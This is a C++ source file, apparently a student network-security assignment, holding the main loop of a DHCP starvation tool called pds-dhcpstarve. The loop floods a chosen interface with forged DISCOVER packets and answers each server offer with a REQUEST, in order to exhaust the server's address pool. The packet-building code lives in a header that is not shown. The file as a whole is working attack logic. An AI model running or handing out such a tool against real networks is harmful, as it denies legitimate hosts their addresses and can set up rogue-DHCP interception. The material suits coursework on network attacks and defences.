/**
  * pds-dhcpstarve
  * author - Jan Pawlus (xpawlu00@stud.fit.vutbr.cz)
**/

#include <iostream>
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "packet.hpp"
#include <sys/mman.h>
#include <unistd.h>
#include <thread>
#include <mutex>
#include <signal.h>
#include <utility>

//global variable for pcap handle so it can be closed during SIGINT
pcap_t* pcap_handle;

void siginthandler(int param)
{
	pcap_close(pcap_handle);
	exit(0);
}

int main(int argc, char *argv[]) {
	std::string device = "";
	int c;
	while ((c = getopt(argc, argv, "i:")) != -1) {
		switch (c) {
			case 'i':
				device = std::string(optarg);
				break;			
			default:
				std::cerr << "Unknown option\n";
				return -1;
		}
	}
	if (device.empty())
	{
		std::cerr << "Interface parameter is mandatory.\n";
		return -1;
	}
	char errbuf[PCAP_ERRBUF_SIZE];
	signal(SIGINT, siginthandler);
	pcap_handle = pcap_open_live(device.c_str(), BUFSIZ, 0, 10, errbuf);
	if (pcap_handle == NULL)
	{
		std::cerr << "Couldn't open interface " << errbuf << std::endl;
		return -1;
	}
	Packet packet(pcap_handle);
	std::vector<protocolIp> protocol;
	//create the listening thread
	std::thread listener(&Packet::clientListener, &packet);
	u_int8_t option = DHCP_DISCOVER;
	protocolIp emptyData;
	emptyData.proposedIp = 0;
	while (1)
	{		
		(packet.m).lock();
		//if listening thread got a response from server
		if (!packet.protocol.empty()) 
		{
			packet.createPacket(DHCP_REQUEST, packet.protocol.back());
			packet.sendPacket();
			packet.protocol.pop_back();
		}
		//just create another discover
		else 
		{
			packet.createPacket(DHCP_DISCOVER, emptyData);
			packet.sendPacket();
		}
		(packet.m).unlock();
		//sleep for 0,2s to avoid congestion and packet loss
		usleep(200000);
	}	
	listener.join();
	return 0;
} 
